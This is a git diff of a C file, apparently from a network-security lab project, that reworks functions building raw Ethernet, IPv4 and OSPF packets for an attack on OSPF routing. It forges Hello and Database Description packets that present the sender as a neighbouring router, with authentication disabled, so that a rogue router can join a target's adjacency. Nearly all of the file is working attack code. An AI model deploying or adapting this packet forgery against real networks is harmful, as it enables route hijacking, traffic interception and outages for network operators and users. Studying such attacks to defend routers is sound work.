@@ -1,58 +1,126 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <errno.h>
 #include <string.h>
-#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <linux/if_ether.h>
+#include <netpacket/packet.h>
 #include <net/ethernet.h>
+#include <netinet/ether.h>
 #include <netinet/ip.h>
+#include <arpa/inet.h>
 
-#include "ospf_attack.h"
-#include "ospf.h"
 #include "checksum.h"
+#include "ospf.h"
+#include "ospf_attack.h"
+#include "utils.h"
 
-int build(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, __u8 packet_type) {
+// "Private methods" for the attack, declared here so that we can reference them
+// at any part of this file instead of having to declare the method first
+int ospf_write_header(unsigned char *buffer, char *local_ip, int ospf_len, unsigned char packet_type);
+int ospf_write_hello(unsigned char *buffer, char *router_ip);
+int ospf_write_db_description(unsigned char* buffer, unsigned long sequence_number, __u8 control);
+int ospf_write_lss_data_block(unsigned char *buffer);
+
+// Writes an OSPF Hello Packet on the buffer and returns the total amount of
+// bytes that should be sent over the network
+int attack_write_hello(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip) {
   // Ethernet header
-  char *dest_ip;
-  int packet_len, swap;
-  if(packet_type - 0x01) {
-    dest_ip = "192.168.3.1";
-    swap = build_database_description_header_ospf(buffer, local_ip, 1, 0x07);
-    packet_len = sizeof(struct ether_header) + sizeof(struct ip) + swap;
-  } else {
-    dest_ip = IPV4_MULTICAST_ADDR;
-    swap = build_hello_header_ospf(buffer, local_ip);
-    packet_len = sizeof(struct ether_header) + sizeof(struct ip) + swap;
-  }
+  unsigned char *dest_mac = parse_mac_addr(IPV4_MULTICAST_MAC);
+  int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);
 
-  unsigned char *dest_mac  = parse_mac_addr(IPV4_MULTICAST_MAC);
-  struct ether_header *eth_header;
-  eth_header = (struct ether_header *) &buffer[0];
-  memcpy(eth_header->ether_dhost, dest_mac, MAC_ADDR_LEN);
-  memcpy(eth_header->ether_shost, local_mac, MAC_ADDR_LEN);
-  eth_header->ether_type = htons(0X800);
+  // Position on the buffer where we should begin writing OSPF data
+  int ospf_packet_offset = ether_header_len + sizeof(struct ip);
+  unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;
+
+  // OSPF sections of the packet
+  int ospf_len = 0;
+  ospf_len += ospf_write_hello(ospf_buffer_ptr + sizeof(struct ospf_header), router_ip);
+  ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, sizeof(struct ospf_hello), OSPF_HELLO_T);
+  ospf_len += ospf_write_lss_data_block(ospf_buffer_ptr + ospf_len);
 
   // IP header
-  struct ip *ip_header;
-  ip_header = (struct ip *) &buffer[sizeof(struct ether_header)];
-  ip_header->ip_hl = 0X5; //sizeof(ip_header);
-  ip_header->ip_v = 4;
-  ip_header->ip_tos = 0xc0;
-  ip_header->ip_len = htons(packet_len - sizeof(struct ether_header));//sizeof(struct ip) + sizeof(struct ospf) + sizeof(struct ospf_hello)+12);//0X2800; //sizeof(struct ip);
-  ip_header->ip_id = htons((int)(rand()/(((double)RAND_MAX + 1)/14095)));
-  ip_header->ip_off = 0;
-  ip_header->ip_ttl = 1;
-  ip_header->ip_p = PROTO_OSPF;
-  ip_header->ip_sum = 0X0000;
-  ip_header->ip_src.s_addr = inet_addr(local_ip);
-  ip_header->ip_dst.s_addr = inet_addr(dest_ip);
-  ip_header->ip_sum = in_cksum((unsigned short*)ip_header, sizeof(struct ip));
+  int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, IPV4_MULTICAST_ADDR, ospf_len);
 
-  return packet_len;
+  return ether_header_len + ip_header_len + ospf_len;
 }
 
-// Based on http://stackoverflow.com/a/3409211
-unsigned char *parse_mac_addr(char *mac_str) {
-  unsigned char *result = calloc(MAC_ADDR_LEN, sizeof(unsigned char));
-  sscanf(mac_str, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", result, result + 1, result + 2, result + 3, result + 4, result + 5);
+// Writes an OSPF DB Description Packet on the buffer and returns the total amount
+// of bytes that should be sent over the network
+int attack_write_db_description(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip) {
+  // Ethernet header
+  unsigned char *dest_mac = parse_mac_addr(IPV4_MULTICAST_MAC);
+  int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);
 
-  return result;
+  // Position on the buffer where we should begin writing OSPF data
+  int ospf_packet_offset = ether_header_len + sizeof(struct ip);
+  unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;
+
+  // OSPF sections of the packet
+  __u8 control = DDC_INIT + DDC_MORE + DDC_MSTR;
+  int ospf_len = 0;
+  ospf_len += ospf_write_db_description(ospf_buffer_ptr + sizeof(struct ospf_header), 1000, control);
+  ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, sizeof(struct ospf_dd), OSPF_DATADESC_T);
+  ospf_len += ospf_write_lss_data_block(ospf_buffer_ptr + ospf_len);
+
+  // IP header
+  int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, router_ip, ospf_len);
+
+  return ether_header_len + ip_header_len + ospf_len;
+}
+
+/******************************************************************************
+ * Methods for building parts of OSPF packets
+ ******************************************************************************/
+
+int ospf_write_header(unsigned char *buffer, char *local_ip, int ospf_data_len, unsigned char packet_type) {
+  int total_len = ospf_data_len + sizeof(struct ospf_header);
+
+  struct ospf_header *header = (struct ospf_header *) buffer;
+  header->ospf_version = OSPF_VERSION;       /* Version Number       */
+  header->ospf_type = packet_type;           /* Packet Type          */
+  header->ospf_len = htons(total_len);       /* Packet Length        */
+  header->ospf_rid = inet_addr(local_ip);    /* Router Identifier    */
+  header->ospf_aid = inet_addr("0.0.0.0");   /* Area Identifier      */
+  header->ospf_cksum = 0x0000;               /* Check Sum            */
+  header->ospf_authtype = AU_NONE;           /* Authentication Type  */
+  header->ospf_auth = 0;                     /* Authentication Field */
+
+  header->ospf_cksum = in_cksum((short unsigned int *)buffer, total_len);
+
+  return sizeof(struct ospf_header);
+}
+
+int ospf_write_hello(unsigned char *buffer, char *router_ip) {
+  struct ospf_hello *hello = (struct ospf_hello *) buffer;
+  hello->oh_netmask = inet_addr("255.255.255.0"); /* Network Mask     */
+  hello->oh_hintv = OSPF_HELLO_INTERVAL;          /* Hello Interval (seconds) */
+  hello->oh_opts = OSPF_HELLO_OPTIONS;            /* Options      */
+  hello->oh_prio = OSPF_HELLO_PRIORITY;           /* Sender's Router Priority */
+  hello->oh_rdintv = inet_addr("0.0.0.40");       /* Seconds Before Declare Dead  */
+  hello->oh_drid = inet_addr(router_ip);          /* Designated Router ID   */
+  hello->oh_brid = inet_addr("0.0.0.0");          /* Backup Designated Router ID  */
+  hello->oh_neighbor = inet_addr(router_ip);      /* Living Neighbors   */
+
+  return sizeof(struct ospf_hello);
+}
+
+int ospf_write_db_description(unsigned char* buffer, unsigned long sequence_number, __u8 control) {
+  struct ospf_dd *database_description_header_ospf = (struct ospf_dd *) buffer;
+  database_description_header_ospf->dd_mbz = htons(1500);                   /* Must Be Zero         */
+  database_description_header_ospf->dd_opts = DD_OPTIONS;                   /* Options          */
+  database_description_header_ospf->dd_control = control;                   /* Control Bits (DDC_* below)   */
+  database_description_header_ospf->dd_seq = htonl(sequence_number);        /* Sequence Number      */
+
+  return sizeof(struct ospf_dd);
+}
+
+int ospf_write_lss_data_block(unsigned char *buffer) {
+  struct ospf_lls *lls_header_ospf = (struct ospf_lls *) buffer;
+  lls_header_ospf->data[0] = 0x0300f6ff;
+  lls_header_ospf->data[1] = 0x04000100;
+  lls_header_ospf->data[2] = 0x01000000;
+
+  return sizeof(struct ospf_lls);
 }
